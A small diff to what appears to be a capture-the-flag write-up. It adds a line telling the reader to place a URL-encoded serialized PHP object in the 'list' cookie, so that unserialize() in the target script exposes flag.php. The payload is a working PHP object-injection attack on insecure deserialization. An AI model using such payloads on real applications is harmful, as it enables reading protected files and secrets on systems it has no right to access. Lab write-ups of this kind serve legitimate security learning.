@@ -55,6 +55,7 @@ $z = unserialize($y);
 echo $z;
 ```
 ```
+put the following string as $_COOKIE['list'];
 a%3A1%3A%7Bi%3A0%3BO%3A11%3A%22whatthefuck%22%3A1%3A%7Bs%3A6%3A%22source%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D
 ```
 
